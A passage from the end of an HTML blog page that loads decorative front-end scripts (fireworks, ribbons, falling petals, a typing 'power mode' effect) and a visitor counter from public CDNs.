src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
